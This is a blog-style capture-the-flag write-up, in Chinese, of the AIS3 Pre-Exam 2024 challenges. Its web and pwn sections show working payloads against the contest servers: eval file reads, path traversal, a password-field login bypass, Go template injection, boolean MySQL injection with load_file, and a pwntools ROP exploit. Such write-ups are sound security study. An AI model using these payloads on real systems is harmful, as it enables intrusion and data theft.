---
title: 【CTF-WriteUp】AIS3 Pre-Exam 2024
date: 2024-06-11
tags:
  - ctf
---

# AIS3 Pre-Exam 2024

先放結果

![result](/images/ctf/ais3_pre_exam_2024/result.png)

![result2](/images/ctf/ais3_pre_exam_2024/result2.png)

![result3](/images/ctf/ais3_pre_exam_2024/result3.png)

My First CTF：潛力獎

## 心得

第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，

希望下次能~~通靈~~出更多題目。

# Write Up

## Misc

### Welcome

簽到題

![image](/images/ctf/ais3_pre_exam_2024/welcome.png)


#### FLAG:

AIS3{Welc0me_to_AIS3_PreExam_2o24!}



### Quantum Nim Heist

```
Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other.
```

跟電腦玩 Nim 遊戲，[Wiki - Nim](https://en.wikipedia.org/wiki/Nim)，

這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。

看到 `server.py`

```python
def menu():
    print_main_menu()
    choice = input('what would you like to do? ').strip()

    if choice == '0':
        print_rules()

    elif choice == '1':
        game = Game()
        game.generate_losing_game()
        play(game)

    elif choice == '2':
        saved = input('enter the saved game: ').strip()
        game_str, digest = saved.split(':')
        if hash.hexdigest(game_str.encode()) == digest:
            game = Game()
            game.load(game_str)
            play(game)
        else:
            print_error('invalid game provided!')

    elif choice == '3':
        print('omg bye!')
        exit(0)
```

可以發現一定會生一個玩家必輸的局面，看看遊戲的操作選項

```python
def play(game: Game):
    ai_player = AIPlayer()
    win = False

    while not game.ended():
        game.show()
        print_game_menu()
        choice = input('it\'s your turn to move! what do you choose? ').strip()

        if choice == '0':
            pile = int(input('which pile do you choose? '))
            count = int(input('how many stones do you remove? '))
            if not game.make_move(pile, count):
                print_error('that is not a valid move!')
                continue

        elif choice == '1':
            game_str = game.save()
            digest = hash.hexdigest(game_str.encode())
            print('you game has been saved! here is your saved game:')
            print(game_str + ':' + digest)
            return

        elif choice == '2':
            break

        # no move -> player wins!
        if game.ended():
            win = True
            break
        else:
            print_move('you', count, pile)
            game.show()

        # the AI plays a move
        pile, count = ai_player.get_move(game)
        assert game.make_move(pile, count)
        print_move('i', count, pile)

    if win:
        print_flag(flag)
        exit(0)
    else:
        print_lose()
```

如果在 choice 輸入的東西不是 0~2，遊戲會根據上次電腦的選擇來操作，而且有趣的地方就在他不會判斷是否真的可以從某堆拿 N 顆石頭。

舉例來說，現在 1 piles 有 2 顆石頭，上次電腦在這堆拿了 5 顆，那麼若 choice 輸入不是 0~2 的東西，就會在 `還剩下 2 顆石頭的這個 pile 裡拿走 5 顆`，而這個無效操作只是會讓 make_move() return False 而已，不會拋出例外而跟你說他死了(但我們還是要先至少 move 一次，讓 pile 跟 count 這兩個變數是 assigned 的，否則 print_move() 會有問題)。

相當於我們在這局拿走了 0 顆石頭，這樣局面就會變成我們必勝了。

簡而言之，不要照規則走就對了

附上解題過程：


```
$ nc chals1.ais3.org 40004
...
+--------------------- moved ---------------------+
| you removed 13 stones from pile 2               |
+---+-------------- stones info ------------------+
| 0 | ooooooooooooooooooooooo                     |
| 1 | ooooo                                       |
| 2 | ooooo                                       |
+--------------------- moved ---------------------+
| i removed 23 stones from pile 0                 |
+---+-------------- stones info ------------------+
| 0 | ooooo                                       |
| 1 | ooooo                                       |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it's your turn to move! what do you choose? 3
+--------------------- moved ---------------------+
| you removed 23 stones from pile 0               |
+---+-------------- stones info ------------------+
| 0 | ooooo                                       |
| 1 | ooooo                                       |
+--------------------- moved ---------------------+
| i removed 4 stones from pile 1                  |
+---+-------------- stones info ------------------+
| 0 | ooooo                                       |
| 1 | o                                           |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it's your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 4
+--------------------- moved ---------------------+
| you removed 4 stones from pile 0                |
+---+-------------- stones info ------------------+
| 0 | o                                           |
| 1 | o                                           |
+--------------------- moved ---------------------+
| i removed 1 stones from pile 0                  |
+---+-------------- stones info ------------------+
| 0 | o                                           |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it's your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 0
+--------------------- error ---------------------+
| that is not a valid move!                       |
+---+-------------- stones info ------------------+
| 0 | o                                           |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it's your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 1
+---------------- congratulations ----------------+
| you are a true grandmaster of chess! here is    |
| the flag for you:                               |
| AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}  |
+-------------------------------------------------+

```


#### FLAG:

AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}

### Three Dimensional Secret

```
I shall send printable secrets

Author: ja20nl1n
```

題目給了一個封包檔，所以用 WireShark 打開

接著把 [PSH, ACK] 狀態 ( PSH 表示有資料，ACK 表示傳輸確認 ) 的封包用工人智慧(？把 data 部分 dump 下來：

(後面的東西太多就不貼了)

```
;FLAVOR:Marlin
;TIME:788
;Filament used: 8.45726m
;Layer height: 10
;MINX:58.496
;MINY:58.537
;MINZ:10
;MAXX:241.742
;MAXY:241.259
;MAXZ:10
;TARGET_MACHINE.NAME:Creality Ender-3 Max
;Generated with Cura_SteamEngine 5.6.0
M140 S60
M105
M190 S60
M104 S200
M105
M109 S200
M82 ;absolute extrusion mode
; Ender 3 Max Custom Start G-code
G92 E0 ; Reset Extruder
G28 ; Home all axes
G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
G1 X0.1 Y20 Z0.3 F5000.0 ; Move to start position
G1 X0.1 Y200.0 Z0.3 F1500.0 E15 ; Draw the first line
G1 X0.4 Y200.0 Z0.3 F5000.0 ; Move to side a little
G1 X0.4 Y20 Z0.3 F1500.0 E30 ; Draw the second line
G92 E0 ; Reset Extruder
G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
G1 X5 Y20 Z0.3 F5000.0 ; Move over to prevent blob squish
G92 E0
G92 E0
G1 F1500 E-6.5
;LAYER_COUNT:1
;LAYER:0
M107
...
```

再根據題目標題可以知道這是 G Code，用來控制 3D 列印機等自控機器的代碼

貼到隨便一個 online viewer 上去模擬就能看到 flag 了

![three_dimensional_secret](/images/ctf/ais3_pre_exam_2024/three_dimensional_secret.png)

#### FLAG:

AIS3{b4d1y_tun3d_PriN73r}


### Emoji Console

```
🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️ 
Connection info: http://chals1.ais3.org:5000 
Author: TriangleSnake
```

使用 `🐱 ⭐` 可以看到 Source Code 以及 emoji 代表的文字，並發現 flag 是一個目錄，沒辦法直接 cat flag

接著我試了 `💿 🚩😜ℹ️🅿️ ⭐` 可以發現 flag 裡有個 `flag-printer.py`

![emoji_console_1](/images/ctf/ais3_pre_exam_2024/emoji_console_1.png)

於是使用 `💿 🚩😓😶🐍 ⭐` ( cd flag;/:|python * ) 來執行這個 .py 檔

其實就是考 Linux 指令的 `;` 跟 `|` 的用法

![emoji_console_2](/images/ctf/ais3_pre_exam_2024/emoji_console_2.png)


#### FLAG:

AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}


## Web

### Evil Calculator

```
This is a calculator written in Python. It's a simple calculator, but some function in it is VERY EVIL!! 
Connection info: http://chals1.ais3.org:5001 
Author: TriangleSnake
```

```python
@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    expression = data['expression'].replace(" ","").replace("_","")
    try:
        result = eval(expression)
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))
```

從程式碼中可以看到他直接使用危險函式 eval() 來計算，但有過濾掉 `_` 跟空格，沒辦法 `__import__('os')` 來做 RCE

但其實可以用 builtin function 中的 open() 來任意讀檔，從題目給的 `docker-compose.yml` 可知 flag 放在 /flag

我的作法是直接 F12 修改前端讓他送 payload 過去

![evil_calculator](/images/ctf/ais3_pre_exam_2024/evil_calculator.png)

記得跳脫引號字元

```
appendToExpression('open(\'../flag\').read()')
```

或是用 burp 攔封包修改應該也行

#### FLAG:

AIS3{7RiANG13_5NAK3_I5_50_3Vi1}


### Capoost

```
Capoo like your post. Post something and capoo will give you flag!!!

Hint: Try to read Dockerfile first.

Connection info: http://capoost.chals1.ais3.org:5487

Author: Chumy
```

先找 Dockerfile

![image](/images/ctf/ais3_pre_exam_2024/capoost_1.png)


帳號密碼先隨便打

![image](/images/ctf/ais3_pre_exam_2024/capoost_2.png)


在 Create New Post 中 F12，看到

![image](/images/ctf/ais3_pre_exam_2024/capoost_3.png)

在 updateTemplateFields 中可以看到會把所選的 template 透過 `GET /template/read?name=${selectedTemplate}`
來獲取模板，因此可以懷疑這邊可以做檔案讀取

跟上題一樣直接改前端就好

或是直接打 `http://HOST:PORT/template/read?name=../Dockerfile` 也可以拿到

![image](/images/ctf/ais3_pre_exam_2024/capoost_4.png)

可以看到是用 golang 寫的並且使用 make 編譯

推測他有 makefile，所以用同上的方式拿 makefile

![image](/images/ctf/ais3_pre_exam_2024/capoost_5.png)

在 makefile 裡又可以看到他編譯了哪些檔案，再把這些檔案用相同的方式拿出來，而這些檔案中又 import 了許多自訂的 module。

假設 module 名為 capoost/models/user，可以到 ../models/user/user.go 拿到原始碼，把所有能拿的程式都拿到後，一個一個分析

![image](/images/ctf/ais3_pre_exam_2024/capoost_6.png)

其中在 ../capoost/router/user/user.go 會將輸入的帳密用 BindJSON 打包後去呼叫 ../capoost/models/user/user.go 的 Login() 來比對

capoost/router/user

```go
func login(c *gin.Context) {
    var userdata user.User
    c.BindJSON(&userdata)
    if !userdata.Login() {
        errutil.AbortAndError(c, &errutil.Err{
            Code: 401,
            Msg: "username or password incorrect",
        })
        return
    }
    session := sessions.Default(c)
    session.Set("user", userdata.Username)
    session.Save()
    c.String(200, "Login success")
}
```

capoost/models/user

```go
func init() {
    const adminname = "4dm1n1337"
    database.GetDB().AutoMigrate(&User{})

    if _, err := GetUser(adminname); err == nil {
        return
    }

    buf := make([]byte, 12)
    _, err := rand.Read(buf)
    if err != nil {
        log.Panicf("error while generating random string: %s", err)
    }
    User{
        //ID: 1,
        Username: adminname,
        Password: password.New(base64.StdEncoding.EncodeToString(buf)),
    }.Create()
}
// ...
func (user User) Login() bool {
    if user.Username == "" {
        return false
    }
    if _, err := GetUser(user.Username); err == nil {
        var loginuser User
        result := database.GetDB().Where(&user).First(&loginuser)
        return result.Error == nil
    }
    return user.Create() == nil
}
```

而這裡有個特性是如果 Json 裡沒有密碼欄的話就不會拿去比對，且後端似乎也沒檢查是否有密碼這欄。

參考：https://www.ctfiot.com/123387.html

所以可利用 burp 改封包，把 password 欄刪掉，資料庫查詢 `database.GetDB().Where(&user).First(&loginuser)`
就只會比對帳號，而不比對密碼。

接著看到 ../capoost/models/user/user.go 的 init() 中有一個叫 4dm1n1337 的管理員，可以透過此漏洞登入

![image](/images/ctf/ais3_pre_exam_2024/capoost_7.png)

管理員可以新增或修改 templates，繼續分析程式碼

在 ../capoost/router/post/post.go 的 readflag() 看起來很有趣，並且 read() 時若滿足 `Owner.ID == 1` (若 Owner 是管理員) 就會將該函式放到 template 的函式執行清單

capoost/router/post

```go
func read(c *gin.Context) {
    // ...
    t := template.New(nowpost.Template)
    if nowpost.Owner.ID == 1 {
        t = t.Funcs(template.FuncMap{
            "G1V3m34Fl4gpL34s3": readflag,
        })
    }
    t = template.Must(t.ParseFiles(path.Join("./template", nowpost.Template)))
    b := new(bytes.Buffer)
    if err = t.Execute(b, nowpost.Data); err != nil {
        panic(err)
    }
    // ...
    if strings.Contains(b.String(), "AIS3") {
        errutil.AbortAndError(c, &errutil.Err{
            Code: 403,
            Msg: "Flag deny",
        })
    }
	// ...
}

func readflag() string {
    out, _ := exec.Command("/readflag").Output()
    return strings.Trim(string(out), " \n\t")
}
```

所以可以先透過管理員新增一個 template，內容為 `{{G1V3m34Fl4gpL34s3 | printf "%q" }}`，但後面又可以得知如果輸出有 AIS3 會被擋住，因此修改一下 payload：
`{{G1V3m34Fl4gpL34s3 | printf "%x" }}`，讓 flag 以 hex 形式輸出，繞過檢查。

而這裡也有一些 function 看起來可以繞過檢查，像是 slice:
https://pkg.go.dev/text/template#hdr-Functions

然而管理員沒辦法新增貼文，但後來從 ../capoost/models/post/post.go 的 UnmarshalJSON 
發現其實可以在 post 封包新增 Owner 一欄，而蓋掉原本的 Owner，也就是可以偽造發文者

capoost/models/post
```go
func (c *Post) UnmarshalJSON(b []byte) error {
    var tmp postjson
    err := json.Unmarshal(b, &tmp)
    if err != nil {
        return err
    }
    c.ID = tmp.ID
    c.Title = tmp.Title
    if tmp.Owner != "" {
        if owner, err := user.GetUser(tmp.Owner); err == nil {
            c.OwnerID = owner.ID
            c.Owner = owner
        }
    }
    c.Template = tmp.Template
    c.Data = tmp.Data
    c.Count = tmp.Count
    return nil
}
```

所以先登入一般使用者帳號，然後新增一個 Owner 為 4dm1n1337，template 為剛剛創建的 template，

![image](/images/ctf/ais3_pre_exam_2024/capoost_8.png)


再點進去就能看到 hex(flag) : 414953337b676f5f347734795f5768595f4172335f7930555f483352335f4361706f6f3a287d

![image](/images/ctf/ais3_pre_exam_2024/capoost_9.png)


解碼後就能得到

![image](/images/ctf/ais3_pre_exam_2024/capoost_10.png)

#### FLAG:

AIS3{go_4w4y_WhY_Ar3_y0U_H3R3_Capoo:(}


### It's MyGO!!!!

```
你說得對，但是《Bang Dream It's MyGO!!!!!》是由武士道企劃的日本少女搖滾樂團。 故事發生在一個被稱為《Bang Dream》的世界觀中，在這裏，不同的少女們將拿起樂器組成樂團。 主角名為「千早愛音」，在愛慕虛榮的引導下邂逅性格沉重的樂團夥伴們，和她們一起舉辦演唱會，找回失落的春日影--同時，逐步發掘「CRYCHIC」的真相。

flag format: AIS3{.+}

charset: unicode

flag is at /flag

http://chals1.ais3.org:11454

Author: ItisCaleb
```

這題是我賽後才補上的，因為 Union 被擋住讓我卡好久...orz


網頁中有送 Data 的地方只有那四首原創曲

`http://chals1.ais3.org:11454/song?id=xxx`

提示說是 MySQL 就想到跟 SQLi 有關，然而如果 SQL 語句有錯網頁會直接不回應 (Timeout)。

作者說因為有兩條指令所以 Union 沒辦法用

而如果送 `id=1 and 1=2` 會得到 No Data

所以現在只能用 Boolean Based SQLi 了。

Payload：

```
id=1 and ascii(substr((select load_file('/flag') limit 0,1),X,1)) > Y
```

* load_file()：MySQL 讀檔案的方法
* limit n, m：從第 n 筆開始取 m 筆資料
* substr(x, y, z)：將字串 x 從第 y 個字開始切 z 個字
* ascii()：把字元用 ASCII 轉換成數字

因為只能知道 True 或 False，所以 X 跟 Y 要慢慢搜，先將 Y 設為 0，X 從 1 到 100 開始二分搜，可以知道 FLAG 的長度為 62

接著我們已經知道 FLAG 格式為 AIS3{.+}，前五個字跟最後一個字可以不用搜尋

所以要先固定 X，然後二分搜 Y 的值(1~256，因為 UTF-8 一個字元是 0~256)，如果結果是 No Data 表示搜尋的值 >= target，否則就是 < target

就這樣一個字元一個字元找


```
http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag') limit 0,1),1,1)) > 65
http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag') limit 0,1),1,1)) > 97
http://chals1.ais3.org:11454/song?id=1 and ascii(substr((select load_file('/flag') limit 0,1),1,1)) > 81
...
```

以此類推得到結果為：

```
"AIS3{CRYCHIC_Funeral_" + 
240,159,152,173,
240,159,142,184,
240,159,152,173,
240,159,142,184,
240,159,152,173,
240,159,142,164,
240,159,152,173,
240,159,165,129,
240,159,152,184,
240,159,142,184
}
```

這些超出 ASCII 範圍的數字可以到 https://www.utf8-chartable.de/unicode-utf8-table.pl 查表，四個數字為一組

就可以得到最終 FLAG

#### FLAG：

AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}

## Rev

### The Long Print

```
Welcome to The Long Print, a challenge where patience is not just a virtue—it's a requirement. But don't be fooled; waiting around won't get you the flag. This task requires your sharp reverse engineering skills to dive into the depths of an ELF binary, seemingly designed with all the time in the world in mind.
```

開 IDA

把 sleep 的參數改成 0

![image](/images/ctf/ais3_pre_exam_2024/the_long_print_1.png)

![image](/images/ctf/ais3_pre_exam_2024/the_long_print_2.png)

分析程式碼發現輸出可能被藏起來了，可以使用 strings 指令印出來

![image](/images/ctf/ais3_pre_exam_2024/the_long_print_3.png)

#### FLAG:

AIS3{You_are_the_master_of_time_management!!!!?}

## Pwn

### Mathter

```
Life may betray you, brothers may deceive you, but mathematics never will. Becaaaaaaaaaaause: math
```

```
Connection info: nc chals1.ais3.org 50001

Author: Kazma
```

看 Checksec

![image](/images/ctf/ais3_pre_exam_2024/mathter_1.png)

* Partial RELRO
* 有開 Canary
* 不可執行
* 沒開 ASLR


開 IDA，其中 goodbye() 有 Buffer Overflow

![image](/images/ctf/ais3_pre_exam_2024/mathter_2.png)

可以注意到其實他沒有 Canary，可以用 padding 去蓋 return address。

後來又發現有兩個函式看起來會印 flag

![image](/images/ctf/ais3_pre_exam_2024/mathter_3.png)

![image](/images/ctf/ais3_pre_exam_2024/mathter_4.png)

這兩個函式都會先看第一個參數 (rdi) 的值才決定要不要印 flag，所以用 ROPgadget 看看能不能控制 rdi

```
$ ROPgadget --binary mathter | grep 'pop rdi'
```

![image](/images/ctf/ais3_pre_exam_2024/mathter_5.png)

有料，開寫 exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './mathter'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'chals1.ais3.org'
    port = 50001
    p = remote(ip, port)
else:
    p = process()
    

p.recvuntil(b'_|\\__\\___|_|\n')
p.sendline(b'q') # 進 goodbye()

pad = 12 # 4 bytes 字元 + 8 bytes offset

win1 = 0x4018c5 # win 1 的 address
win2 = 0x401997 # win 2 的 address
pop_rdi = 0x402540 # 找到的 Gadget 的 address

payload = flat([b'A' * pad, pop_rdi,0xDEADBEEF,win1,pop_rdi,0xCAFEBABE,win2]) 
# 兩個要檢查的數字是 0xDEADBEEF 跟 0xCAFEBABE，pop rdi 會把 rdi 設成 stack top 的值
p.sendlineafter(b'[Y/n]', payload);

p.interactive()
```

![image](/images/ctf/ais3_pre_exam_2024/mathter_6.png)




#### FLAG:

AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}
